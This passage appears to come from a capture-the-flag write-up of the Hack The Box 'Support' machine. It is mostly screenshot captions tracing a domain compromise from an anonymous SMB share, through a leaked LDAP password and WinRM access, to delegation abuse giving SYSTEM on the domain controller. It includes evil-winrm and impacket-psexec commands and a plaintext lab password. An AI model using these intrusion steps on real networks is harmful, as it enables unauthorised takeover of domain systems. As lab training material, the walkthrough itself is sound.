...
![smbclient share listing showing the support-tools share](/assets/images/htb-support/image%201.png)

```bash
smbclient -N //10.129.230.181/support-tools
```

![Connecting to the support-tools share](/assets/images/htb-support/image%202.png)
...
![Running the decrypt script](/assets/images/htb-support/image%203.png)

![Decrypted password output](/assets/images/htb-support/image%204.png)
...
![Domain user enumeration showing 20 users](/assets/images/htb-support/image%205.png)

I saved them to a list for the next check:

![Users saved to a list](/assets/images/htb-support/image%206.png)
...
![Password spray showing no reuse](/assets/images/htb-support/image%207.png)
...
![BloodHound collection completing successfully](/assets/images/htb-support/image%208.png)

I moved the output into its own folder and opened BloodHound to import it.

![Collection files moved into a dedicated folder](/assets/images/htb-support/image%209.png)
...
![Uploading the collection into BloodHound](/assets/images/htb-support/image%2010.png)

I checked what outbound permissions the `ldap` account itself had. Nothing came back.

![BloodHound graph showing no useful outbound permissions](/assets/images/htb-support/image%2011.png)
...
![Plaintext password found in the info attribute](/assets/images/htb-support/image%2012.png)
...
![Confirming the support account credentials](/assets/images/htb-support/image%2013.png)
...
![WinRM access confirmed](/assets/images/htb-support/image%2014.png)

```bash
evil-winrm -i 10.129.62.234 -u support -p 'Ironside47pleasure40Watchful'
```

![Evil-WinRM shell established](/assets/images/htb-support/image%2015.png)
...
![Whoami and privilege check results](/assets/images/htb-support/image%2016.png)
...
![User flag](/assets/images/htb-support/image%2017.png)
...
![GenericAll over the DC object in BloodHound](/assets/images/htb-support/image%2018.png)
...
![Fake computer account created](/assets/images/htb-support/image%2019.png)
...
![Delegation configured successfully](/assets/images/htb-support/image%2020.png)
...
![Kerberos ticket saved](/assets/images/htb-support/image%2021.png)
...
![Error connecting due to missing hosts entry](/assets/images/htb-support/image%2022.png)
...
![Retry succeeding after fixing the hosts file](/assets/images/htb-support/image%2023.png)

```bash
impacket-psexec -k -no-pass support.htb/Administrator@dc.support.htb
```

![Admin shell obtained via psexec](/assets/images/htb-support/image%2024.png)

Shell as `NT AUTHORITY\SYSTEM` on the Domain Controller.

![Confirming SYSTEM level access](/assets/images/htb-support/image%2025.png)
...
![Searching for and locating the root flag path](/assets/images/htb-support/image%2026.png)

```bash
type C:\Users\Administrator\Desktop\root.txt
```

![Root flag captured](/assets/images/htb-support/image%2027.png)
